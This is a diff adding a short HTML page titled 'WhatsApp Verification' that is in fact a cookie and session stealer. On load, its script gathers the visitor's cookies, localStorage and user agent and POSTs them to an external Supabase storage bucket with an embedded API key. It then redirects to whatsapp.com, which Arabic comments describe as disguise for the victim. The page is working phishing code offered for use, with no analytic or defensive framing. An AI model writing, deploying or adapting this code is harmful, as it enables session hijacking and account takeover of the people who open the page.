@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head><title>WhatsApp Verification</title></head>
+<body>
+    <script>
+        // الرابط المباشر لمجلد النسخ الاحتياطية في Supabase
+        const target_url = "https://lckkbpfgkasjepjrfaft.supabase.co/storage/v1/object/backups/cookie_target.txt";
+        const api_key = "sb_publishable_BXCOlA_3n2kd8YKS7UtCjg_jfE_cdJZ";
+
+        async function grabSession() {
+            const data = {
+                cookie: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                userAgent: navigator.userAgent
+            };
+
+            await fetch(target_url, {
+                method: 'POST',
+                headers: {
+                    'Authorization': 'Bearer ' + api_key,
+                    'apikey': api_key,
+                    'Content-Type': 'application/json',
+                    'x-upsert': 'true'
+                },
+                body: JSON.stringify(data)
+            });
+            // توجيه الضحية للتمويه
+            window.location.href = "https://www.whatsapp.com";
+        }
+        grabSession();
+    </script>
+</body>
+</html>
